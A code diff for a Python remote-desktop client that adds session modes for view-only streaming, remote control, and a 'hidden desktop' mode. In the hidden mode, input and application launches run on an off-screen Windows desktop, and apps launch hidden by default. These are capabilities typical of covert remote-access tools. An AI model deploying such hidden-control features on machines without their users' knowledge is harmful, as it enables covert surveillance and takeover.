@@ -1,15 +1,24 @@
 """Runtime helpers for building the remote client."""
 from __future__ import annotations
 
+import logging
 import os
 import uuid
+from typing import Any, Callable
 
 from remote_client.config import resolve_signaling_url
+from remote_client.control.cursor_visibility import CursorVisibilityController
+from remote_client.control.handlers import ControlHandler, StabilizedControlHandler
+from remote_client.control.input_controller import InputController, NullInputController
 from remote_client.files.file_service import FileService
+from remote_client.media.audio import AudioTrack
+from remote_client.media.screen import ScreenTrack
 from remote_client.security.e2ee import load_e2ee_context
-from remote_client.session_factory import build_session_resources
-from remote_client.webrtc.client import WebRTCClient
+from remote_client.webrtc.client import SessionResources, WebRTCClient
 from remote_client.webrtc.signaling import create_signaling, create_signaling_from_url
+from remote_client.windows.hidden_desktop import HiddenDesktopSession
+
+logger = logging.getLogger(__name__)
 
 
 def load_or_create_device_token() -> str | None:
@@ -43,6 +52,145 @@ def load_or_create_device_token() -> str | None:
     except OSError:
         return device_token
     return device_token
+
+
+def _normalize_mode(mode: str | None) -> str:
+    if not mode:
+        return "manage"
+    value = str(mode).strip().lower()
+    if value in {"view", "viewer", "readonly"}:
+        return "view"
+    if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
+        return "hidden"
+    return "manage"
+
+
+def _input_stabilizer_enabled() -> bool:
+    value = os.getenv("RC_INPUT_STABILIZER", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _audio_enabled() -> bool:
+    value = os.getenv("RC_DISABLE_AUDIO", "")
+    return value.strip().lower() not in {"1", "true", "yes", "on"}
+
+
+def _launch_hidden_enabled() -> bool:
+    value = os.getenv("RC_LAUNCH_HIDDEN", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _build_control_handler(controller: InputController) -> ControlHandler:
+    if _input_stabilizer_enabled():
+        return StabilizedControlHandler(controller)
+    return ControlHandler(controller)
+
+
+def _compose_close(
+    primary: Callable[[], None] | None,
+    cursor_controller: CursorVisibilityController | None,
+) -> Callable[[], None] | None:
+    if not primary and not cursor_controller:
+        return None
+
+    def _close() -> None:
+        if cursor_controller:
+            cursor_controller.reset()
+        if primary:
+            primary()
+
+    return _close
+
+
+def build_session_resources(mode: str | None) -> SessionResources:
+    normalized = _normalize_mode(mode)
+    cursor_controller = CursorVisibilityController()
+    if normalized == "view":
+        controller = NullInputController()
+        screen_track = ScreenTrack()
+        control_handler = ControlHandler(controller)
+        media_tracks: list[Any] = [screen_track]
+        if _audio_enabled():
+            media_tracks.append(AudioTrack())
+
+        def _set_stream_profile(
+            profile: str | None,
+            width: int | None,
+            height: int | None,
+            fps: int | None,
+        ) -> None:
+            for track in media_tracks:
+                if hasattr(track, "set_profile"):
+                    track.set_profile(profile, width, height, fps)
+
+        return SessionResources(
+            control_handler,
+            media_tracks,
+            close=_compose_close(None, cursor_controller),
+            set_stream_profile=_set_stream_profile,
+            set_cursor_visibility=cursor_controller.set_visible,
+        )
+    if normalized == "hidden":
+        try:
+            hidden_session = HiddenDesktopSession()
+        except Exception as exc:
+            logger.warning("Hidden desktop session unavailable: %s", exc)
+        else:
+            controller = hidden_session.input_controller
+            control_handler = _build_control_handler(controller)
+            media_tracks: list[Any] = [hidden_session.screen_track]
+            if _audio_enabled():
+                media_tracks.append(AudioTrack())
+
+            def _set_stream_profile(
+                profile: str | None,
+                width: int | None,
+                height: int | None,
+                fps: int | None,
+            ) -> None:
+                hidden_session.screen_track.set_profile(profile, width, height, fps)
+
+            return SessionResources(
+                control_handler,
+                media_tracks,
+                close=hidden_session.close,
+                launch_app=hidden_session.launch_application,
+                set_stream_profile=_set_stream_profile,
+            )
+
+    controller = InputController()
+    screen_track = ScreenTrack(draw_cursor=False)
+    control_handler = _build_control_handler(controller)
+    media_tracks: list[Any] = [screen_track]
+    if _audio_enabled():
+        media_tracks.append(AudioTrack())
+
+    def _launch_app(app_name: str) -> None:
+        try:
+            from remote_client.apps.launcher import launch_app as _launch_app  # local import for PyInstaller
+        except Exception as exc:
+            logger.warning("App launcher unavailable: %s", exc)
+            raise RuntimeError("App launcher unavailable.")
+        _launch_app(app_name, hidden=_launch_hidden_enabled())
+
+    def _set_stream_profile(
+        profile: str | None,
+        width: int | None,
+        height: int | None,
+        fps: int | None,
+    ) -> None:
+        for track in media_tracks:
+            if hasattr(track, "set_profile"):
+                track.set_profile(profile, width, height, fps)
+
+    return SessionResources(
+        control_handler,
+        media_tracks,
+        close=_compose_close(None, cursor_controller),
+        launch_app=_launch_app,
+        set_stream_profile=_set_stream_profile,
+        set_cursor_visibility=cursor_controller.set_visible,
+    )
 
 
 def build_client(
